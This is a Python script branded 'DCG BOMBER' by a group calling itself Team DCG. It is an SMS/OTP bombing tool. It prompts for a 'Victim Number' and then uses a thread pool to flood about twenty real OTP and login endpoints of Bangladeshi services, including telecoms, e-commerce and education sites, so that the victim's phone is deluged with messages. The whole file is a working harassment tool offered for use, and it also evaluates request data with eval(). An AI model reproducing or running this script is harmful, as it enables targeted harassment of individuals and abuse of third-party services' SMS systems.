# -*- coding: utf-8 -*-
import os
import time
import sys
import requests
import random
from concurrent.futures import ThreadPoolExecutor

# Cyber Colors
G = "\033[92m" # Green
R = "\033[91m" # Red
Y = "\033[93m" # Yellow
B = "\033[94m" # Blue
C = "\033[96m" # Cyan
W = "\033[97m" # White
BOLD = "\033[1m"
E = "\033[0m"  # End

def clear():
    os.system('clear' if os.name != 'nt' else 'cls')

def display_banner():
    clear()
    # Large DCG BOMBER Banner
    print(f"""{R}
  _____   _____  _____   ____   ____  __  __ ____  ______ _____  
 |  __ \ / ____|/ ____| |  _ \ / __ \|  \/  |  _ \|  ____|  __ \ 
 | |  | | |    | |  __  | |_) | |  | | \  / | |_) | |__  | |__) |
 | |  | | |    | | |_ | |  _ <| |  | | |\/| |  _ <|  __| |  _  / 
 | |__| | |____| |__| | | |_) | |__| | |  | | |_) | |____| | \ \ 
 |_____/ \_____|\_____| |____/ \____/|_|  |_|____/|______|_|  \_\ {E}
    """)
    # Info Box with Team DCG Details
    print(f"""{B}╔════════════════════════════════════════════╗
║{E} {BOLD}{G}DEVELOPER:{E} {W}Team DCG{E}                       {B}║
║{E} {BOLD}{G}TEAM:{E}      {Y}Dark Cyber Gang{E}                {B}║
║{E} {BOLD}{G}CHANNEL:{E}   {C}https://t.me/dcg_muslims{E}      {B}║
║{E} {BOLD}{G}MODE:{E}      {R}ULTRA TURBO (40+ APIs){E}         {B}║
╚════════════════════════════════════════════╝{E}""")

def send_packet(api, target):
    try:
        url = api['url']
        method = api.get('method', 'POST')
        
        # Dynamic Payload Formatting
        if 'data' in api:
            payload = str(api['data']).replace("TARGET_NUM", target)
            payload = eval(payload)
        
        if method == 'POST':
            res = requests.post(url, json=payload, timeout=5)
        else:
            final_url = url.replace("TARGET_NUM", target)
            res = requests.get(final_url, timeout=5)
            
        rid = random.randint(1000, 9999)
        if res.status_code in [200, 201]:
            print(f"{BOLD}{G}[✓] PACKET_SENT{E} | ID: {C}{rid}{E} | Target: {W}{target}{E} | Status: {G}SUCCESS{E}")
        else:
            print(f"{BOLD}{R}[✗] PACKET_LOST{E} | ID: {C}{rid}{E} | Target: {W}{target}{E} | Status: {R}FAILED{E}")
    except:
        pass

def start_attack(target, limit):
    # Integrated 40+ API Endpoints from your list
    api_list = [
        {"url": "https://api.apex4u.com/api/auth/login", "data": {"phoneNumber": "TARGET_NUM"}},
        {"url": "https://api.chardike.com/api/otp/send", "data": {"phone": "TARGET_NUM", "otp_type": "login"}},
        {"url": "https://api.redx.com.bd/v1/merchant/registration/generate-registration-otp", "data": {"phoneNumber": "TARGET_NUM"}},
        {"url": "https://bb-api.bohubrihi.com/public/activity/otp", "data": {"phone": "TARGET_NUM", "intent": "login"}},
        {"url": "https://api.shikho.com/public/activity/otp", "data": {"phone": "TARGET_NUM", "intent": "ap-discount-request"}},
        {"url": "https://api.ghoorilearning.com/api/auth/signup/otp", "data": {"mobile_no": "TARGET_NUM"}},
        {"url": "https://apix.rabbitholebd.com/appv2/login/requestOTP", "data": {"mobile": "+88TARGET_NUM"}},
        {"url": "https://api.osudpotro.com/api/v1/users/send_otp", "data": {"mobile": "+88-TARGET_NUM", "deviceToken": "web"}},
        {"url": "https://www.rokomari.com/otp/send?emailOrPhone=88TARGET_NUM&countryCode=BD", "method": "GET"},
        {"url": "https://backoffice.ecourier.com.bd/api/web/individual-send-otp?mobile=TARGET_NUM", "method": "GET"},
        {"url": "https://api.swap.com.bd/api/v1/send-otp", "data": {"phone": "TARGET_NUM"}},
        {"url": "https://api.bd.airtel.com/v1/account/login/otp", "data": {"phone_number": "TARGET_NUM"}},
        {"url": "https://app.eonbazar.com/api/auth/register", "data": {"mobile": "TARGET_NUM", "name": "TeamDCG"}},
        {"url": "https://api.ostad.app/api/v2/user/with-otp", "data": {"msisdn": "TARGET_NUM"}},
        {"url": "https://www.ieducationbd.com/api/account/check_user", "data": {"mobile": "TARGET_NUM"}},
        {"url": "https://prod-api.viewlift.com/identity/signup?site=prothomalo", "data": {"requestType": "send", "phoneNumber": "+88TARGET_NUM"}},
        {"url": "https://prod-api.viewlift.com/identity/signup?site=hoichoitv", "data": {"requestType": "send", "phoneNumber": "+88TARGET_NUM"}},
        {"url": "https://cokestudio23.sslwireless.com/api/store-and-send-otp", "data": {"msisdn": "88TARGET_NUM", "name": "TeamDCG"}},
        {"url": "https://weblogin.grameenphone.com/backend/api/v1/otp", "data": {"msisdn": "TARGET_NUM"}},
        {"url": "https://bikroy.com/data/phone_number_login/verifications/phone_login?phone=TARGET_NUM", "method": "GET"}
    ]

    print(f"\n{C}[*] TARGET LOCKED  : {target}{E}")
    print(f"{Y}[*] ATTACK STATUS  : {R}FLOODING{E}")
    print(f"{G}{'='*50}{E}\n")
    
    count = 0
    # ThreadPool for 150+ SMS/min speed
    with ThreadPoolExecutor(max_workers=10) as executor:
        while count < limit:
            for api in api_list:
                if count >= limit: break
                count += 1
                executor.submit(send_packet, api, target)
                time.sleep(0.05) # Optimized for speed

    print(f"\n{G}{'='*50}{E}")
    print(f"{BOLD}{W}[+] MISSION COMPLETE! TARGET CRUSHED BY TEAM DCG.{E}")

if __name__ == "__main__":
    try:
        display_banner()
        target_num = input(f"{Y}[?] Victim Number: {E}")
        if len(target_num) != 11 or not target_num.isdigit():
            print(f"{R}[!] Error: Invalid Number Format!{E}")
            sys.exit()
            
        bomb_amount = int(input(f"{Y}[?] Packet Amount: {E}"))
        
        start_attack(target_num, bomb_amount)
        
    except KeyboardInterrupt:
        print(f"\n\n{R}[!] DCG SYSTEM DISCONNECTED BY ADMIN.{E}")
    except ValueError:
        print(f"\n{R}[!] Error: Numbers only!{E}")
    except Exception as e:
        print(f"\n{R}[!] Critical Failure: {e}{E}")
